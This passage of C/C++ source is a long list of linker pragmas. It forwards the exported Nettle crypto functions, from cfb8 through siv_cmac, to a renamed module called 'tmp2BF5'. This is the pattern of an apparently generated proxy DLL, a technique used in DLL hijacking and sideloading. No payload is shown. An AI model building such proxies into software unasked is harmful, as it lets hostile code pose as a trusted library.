comment(linker, &quot;/export:nettle_cfb8_decrypt=tmp2BF5.nettle_cfb8_decrypt,@181&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_encrypt=tmp2BF5.nettle_cfb8_encrypt,@182&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_decrypt=tmp2BF5.nettle_cfb_decrypt,@183&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_encrypt=tmp2BF5.nettle_cfb_encrypt,@184&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt=tmp2BF5.nettle_chacha_crypt,@185&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt32=tmp2BF5.nettle_chacha_crypt32,@186&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305=tmp2BF5.nettle_chacha_poly1305,@187&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_decrypt=tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_digest=tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_encrypt=tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_key=tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_nonce=tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_update=tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter=tmp2BF5.nettle_chacha_set_counter,@194&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter32=tmp2BF5.nettle_chacha_set_counter32,@195&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_key=tmp2BF5.nettle_chacha_set_key,@196&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce=tmp2BF5.nettle_chacha_set_nonce,@197&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce96=tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_digest=tmp2BF5.nettle_cmac128_digest,@199&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_init=tmp2BF5.nettle_cmac128_init,@200&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_set_key=tmp2BF5.nettle_cmac128_set_key,@201&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_update=tmp2BF5.nettle_cmac128_update,@202&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_digest=tmp2BF5.nettle_cmac64_digest,@203&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_init=tmp2BF5.nettle_cmac64_init,@204&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_set_key=tmp2BF5.nettle_cmac64_set_key,@205&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_update=tmp2BF5.nettle_cmac64_update,@206&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128=tmp2BF5.nettle_cmac_aes128,@207&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_digest=tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_set_key=tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_update=tmp2BF5.nettle_cmac_aes128_update,@210&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256=tmp2BF5.nettle_cmac_aes256,@211&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_digest=tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_set_key=tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_update=tmp2BF5.nettle_cmac_aes256_update,@214&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3=tmp2BF5.nettle_cmac_des3,@215&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_digest=tmp2BF5.nettle_cmac_des3_digest,@216&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_set_key=tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_update=tmp2BF5.nettle_cmac_des3_update,@218&quot;)#pragma comment(linker, &quot;/export:nettle_cnd_memcpy=tmp2BF5.nettle_cnd_memcpy,@219&quot;)#pragma comment(linker, &quot;/export:nettle_ctr_crypt=tmp2BF5.nettle_ctr_crypt,@220&quot;)#pragma comment(linker, &quot;/export:nettle_des3_decrypt=tmp2BF5.nettle_des3_decrypt,@221&quot;)#pragma comment(linker, &quot;/export:nettle_des3_encrypt=tmp2BF5.nettle_des3_encrypt,@222&quot;)#pragma comment(linker, &quot;/export:nettle_des3_set_key=tmp2BF5.nettle_des3_set_key,@223&quot;)#pragma comment(linker, &quot;/export:nettle_des_check_parity=tmp2BF5.nettle_des_check_parity,@224&quot;)#pragma comment(linker, &quot;/export:nettle_des_decrypt=tmp2BF5.nettle_des_decrypt,@225&quot;)#pragma comment(linker, &quot;/export:nettle_des_encrypt=tmp2BF5.nettle_des_encrypt,@226&quot;)#pragma comment(linker, &quot;/export:nettle_des_fix_parity=tmp2BF5.nettle_des_fix_parity,@227&quot;)#pragma comment(linker, &quot;/export:nettle_des_set_key=tmp2BF5.nettle_des_set_key,@228&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128=tmp2BF5.nettle_eax_aes128,@229&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_decrypt=tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_digest=tmp2BF5.nettle_eax_aes128_digest,@231&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_encrypt=tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_key=tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_nonce=tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_update=tmp2BF5.nettle_eax_aes128_update,@235&quot;)#pragma comment(linker, &quot;/export:nettle_eax_decrypt=tmp2BF5.nettle_eax_decrypt,@236&quot;)#pragma comment(linker, &quot;/export:nettle_eax_digest=tmp2BF5.nettle_eax_digest,@237&quot;)#pragma comment(linker, &quot;/export:nettle_eax_encrypt=tmp2BF5.nettle_eax_encrypt,@238&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_key=tmp2BF5.nettle_eax_set_key,@239&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_nonce=tmp2BF5.nettle_eax_set_nonce,@240&quot;)#pragma comment(linker, &quot;/export:nettle_eax_update=tmp2BF5.nettle_eax_update,@241&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128=tmp2BF5.nettle_gcm_aes128,@242&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_decrypt=tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_digest=tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_encrypt=tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_iv=tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_key=tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_update=tmp2BF5.nettle_gcm_aes128_update,@248&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192=tmp2BF5.nettle_gcm_aes192,@249&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_decrypt=tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_digest=tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_encrypt=tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_iv=tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_key=tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_update=tmp2BF5.nettle_gcm_aes192_update,@255&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256=tmp2BF5.nettle_gcm_aes256,@256&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_decrypt=tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_digest=tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_encrypt=tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_iv=tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_key=tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_update=tmp2BF5.nettle_gcm_aes256_update,@262&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_decrypt=tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_digest=tmp2BF5.nettle_gcm_aes_digest,@264&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_encrypt=tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_iv=tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_key=tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_update=tmp2BF5.nettle_gcm_aes_update,@268&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128=tmp2BF5.nettle_gcm_camellia128,@269&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_decrypt=tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_digest=tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_encrypt=tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_iv=tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_key=tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_update=tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256=tmp2BF5.nettle_gcm_camellia256,@276&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_decrypt=tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_digest=tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_encrypt=tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_iv=tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_key=tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_update=tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_decrypt=tmp2BF5.nettle_gcm_decrypt,@283&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_digest=tmp2BF5.nettle_gcm_digest,@284&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_encrypt=tmp2BF5.nettle_gcm_encrypt,@285&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_iv=tmp2BF5.nettle_gcm_set_iv,@286&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_key=tmp2BF5.nettle_gcm_set_key,@287&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_update=tmp2BF5.nettle_gcm_update,@288&quot;)#pragma comment(linker, &quot;/export:nettle_get_aeads=tmp2BF5.nettle_get_aeads,@289&quot;)#pragma comment(linker, &quot;/export:nettle_get_armors=tmp2BF5.nettle_get_armors,@290&quot;)#pragma comment(linker, &quot;/export:nettle_get_ciphers=tmp2BF5.nettle_get_ciphers,@291&quot;)#pragma comment(linker, &quot;/export:nettle_get_hashes=tmp2BF5.nettle_get_hashes,@292&quot;)#pragma comment(linker, &quot;/export:nettle_get_macs=tmp2BF5.nettle_get_macs,@293&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94=tmp2BF5.nettle_gosthash94,@294&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_digest=tmp2BF5.nettle_gosthash94_digest,@295&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_init=tmp2BF5.nettle_gosthash94_init,@296&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_update=tmp2BF5.nettle_gosthash94_update,@297&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp=tmp2BF5.nettle_gosthash94cp,@298&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_digest=tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_update=tmp2BF5.nettle_gosthash94cp_update,@300&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_expand=tmp2BF5.nettle_hkdf_expand,@301&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_extract=tmp2BF5.nettle_hkdf_extract,@302&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_digest=tmp2BF5.nettle_hmac_digest,@303&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_digest=tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_set_key=tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_update=tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_digest=tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_set_key=tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_update=tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5=tmp2BF5.nettle_hmac_md5,@310&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_digest=tmp2BF5.nettle_hmac_md5_digest,@311&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_set_key=tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_update=tmp2BF5.nettle_hmac_md5_update,@313&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160=tmp2BF5.nettle_hmac_ripemd160,@314&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_digest=tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_set_key=tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_update=tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_set_key=tmp2BF5.nettle_hmac_set_key,@318&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1=tmp2BF5.nettle_hmac_sha1,@319&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_digest=tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_set_key=tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_update=tmp2BF5.nettle_hmac_sha1_update,@322&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224=tmp2BF5.nettle_hmac_sha224,@323&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_digest=tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_set_key=tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256=tmp2BF5.nettle_hmac_sha256,@326&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_digest=tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_set_key=tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_update=tmp2BF5.nettle_hmac_sha256_update,@329&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384=tmp2BF5.nettle_hmac_sha384,@330&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_digest=tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_set_key=tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512=tmp2BF5.nettle_hmac_sha512,@333&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_digest=tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_set_key=tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_update=tmp2BF5.nettle_hmac_sha512_update,@336&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_update=tmp2BF5.nettle_hmac_update,@337&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get=tmp2BF5.nettle_knuth_lfib_get,@338&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get_array=tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_init=tmp2BF5.nettle_knuth_lfib_init,@340&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_random=tmp2BF5.nettle_knuth_lfib_random,@341&quot;)#pragma comment(linker, &quot;/export:nettle_lookup_hash=tmp2BF5.nettle_lookup_hash,@342&quot;)#pragma comment(linker, &quot;/export:nettle_md2=tmp2BF5.nettle_md2,@343&quot;)#pragma comment(linker, &quot;/export:nettle_md2_digest=tmp2BF5.nettle_md2_digest,@344&quot;)#pragma comment(linker, &quot;/export:nettle_md2_init=tmp2BF5.nettle_md2_init,@345&quot;)#pragma comment(linker, &quot;/export:nettle_md2_update=tmp2BF5.nettle_md2_update,@346&quot;)#pragma comment(linker, &quot;/export:nettle_md4=tmp2BF5.nettle_md4,@347&quot;)#pragma comment(linker, &quot;/export:nettle_md4_digest=tmp2BF5.nettle_md4_digest,@348&quot;)#pragma comment(linker, &quot;/export:nettle_md4_init=tmp2BF5.nettle_md4_init,@349&quot;)#pragma comment(linker, &quot;/export:nettle_md4_update=tmp2BF5.nettle_md4_update,@350&quot;)#pragma comment(linker, &quot;/export:nettle_md5=tmp2BF5.nettle_md5,@351&quot;)#pragma comment(linker, &quot;/export:nettle_md5_compress=tmp2BF5.nettle_md5_compress,@352&quot;)#pragma comment(linker, &quot;/export:nettle_md5_digest=tmp2BF5.nettle_md5_digest,@353&quot;)#pragma comment(linker, &quot;/export:nettle_md5_init=tmp2BF5.nettle_md5_init,@354&quot;)#pragma comment(linker, &quot;/export:nettle_md5_update=tmp2BF5.nettle_md5_update,@355&quot;)#pragma comment(linker, &quot;/export:nettle_memeql_sec=tmp2BF5.nettle_memeql_sec,@356&quot;)#pragma comment(linker, &quot;/export:nettle_memxor=tmp2BF5.nettle_memxor,@357&quot;)#pragma comment(linker, &quot;/export:nettle_memxor3=tmp2BF5.nettle_memxor3,@358&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2=tmp2BF5.nettle_pbkdf2,@359&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_gosthash94cp=tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha1=tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha256=tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_digest=tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_key=tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_nonce=tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_update=tmp2BF5.nettle_poly1305_aes_update,@366&quot;)#pragma comment(linker, &quot;/export:nettle_realloc=tmp2BF5.nettle_realloc,@367&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160=tmp2BF5.nettle_ripemd160,@368&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_digest=tmp2BF5.nettle_ripemd160_digest,@369&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_init=tmp2BF5.nettle_ripemd160_init,@370&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_update=tmp2BF5.nettle_ripemd160_update,@371&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_128_set_key=tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_256_set_key=tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_crypt=tmp2BF5.nettle_salsa20_crypt,@374&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_key=tmp2BF5.nettle_salsa20_set_key,@375&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_nonce=tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20r12_crypt=tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128=tmp2BF5.nettle_serpent128,@378&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128_set_key=tmp2BF5.nettle_serpent128_set_key,@379&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192=tmp2BF5.nettle_serpent192,@380&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192_set_key=tmp2BF5.nettle_serpent192_set_key,@381&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256=tmp2BF5.nettle_serpent256,@382&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256_set_key=tmp2BF5.nettle_serpent256_set_key,@383&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_decrypt=tmp2BF5.nettle_serpent_decrypt,@384&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_encrypt=tmp2BF5.nettle_serpent_encrypt,@385&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_set_key=tmp2BF5.nettle_serpent_set_key,@386&quot;)#pragma comment(linker, &quot;/export:nettle_sha1=tmp2BF5.nettle_sha1,@387&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_compress=tmp2BF5.nettle_sha1_compress,@388&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_digest=tmp2BF5.nettle_sha1_digest,@389&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_init=tmp2BF5.nettle_sha1_init,@390&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_update=tmp2BF5.nettle_sha1_update,@391&quot;)#pragma comment(linker, &quot;/export:nettle_sha224=tmp2BF5.nettle_sha224,@392&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_digest=tmp2BF5.nettle_sha224_digest,@393&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_init=tmp2BF5.nettle_sha224_init,@394&quot;)#pragma comment(linker, &quot;/export:nettle_sha256=tmp2BF5.nettle_sha256,@395&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_digest=tmp2BF5.nettle_sha256_digest,@396&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_init=tmp2BF5.nettle_sha256_init,@397&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_update=tmp2BF5.nettle_sha256_update,@398&quot;)#pragma comment(linker, &quot;/export:nettle_sha384=tmp2BF5.nettle_sha384,@399&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_digest=tmp2BF5.nettle_sha384_digest,@400&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_init=tmp2BF5.nettle_sha384_init,@401&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224=tmp2BF5.nettle_sha3_224,@402&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_digest=tmp2BF5.nettle_sha3_224_digest,@403&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_init=tmp2BF5.nettle_sha3_224_init,@404&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_update=tmp2BF5.nettle_sha3_224_update,@405&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256=tmp2BF5.nettle_sha3_256,@406&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_digest=tmp2BF5.nettle_sha3_256_digest,@407&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_init=tmp2BF5.nettle_sha3_256_init,@408&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_shake=tmp2BF5.nettle_sha3_256_shake,@409&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_update=tmp2BF5.nettle_sha3_256_update,@410&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384=tmp2BF5.nettle_sha3_384,@411&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_digest=tmp2BF5.nettle_sha3_384_digest,@412&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_init=tmp2BF5.nettle_sha3_384_init,@413&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_update=tmp2BF5.nettle_sha3_384_update,@414&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512=tmp2BF5.nettle_sha3_512,@415&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_digest=tmp2BF5.nettle_sha3_512_digest,@416&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_init=tmp2BF5.nettle_sha3_512_init,@417&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_update=tmp2BF5.nettle_sha3_512_update,@418&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_permute=tmp2BF5.nettle_sha3_permute,@419&quot;)#pragma comment(linker, &quot;/export:nettle_sha512=tmp2BF5.nettle_sha512,@420&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224=tmp2BF5.nettle_sha512_224,@421&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_digest=tmp2BF5.nettle_sha512_224_digest,@422&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_init=tmp2BF5.nettle_sha512_224_init,@423&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256=tmp2BF5.nettle_sha512_256,@424&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_digest=tmp2BF5.nettle_sha512_256_digest,@425&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_init=tmp2BF5.nettle_sha512_256_init,@426&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_digest=tmp2BF5.nettle_sha512_digest,@427&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_init=tmp2BF5.nettle_sha512_init,@428&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_update=tmp2BF5.nettle_sha512_update,@429&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_decrypt_message=tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_encrypt_message=tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_set_key=tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_decrypt_message=tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_encrypt_message=tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_set_key=tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)#pragma comment(linker, 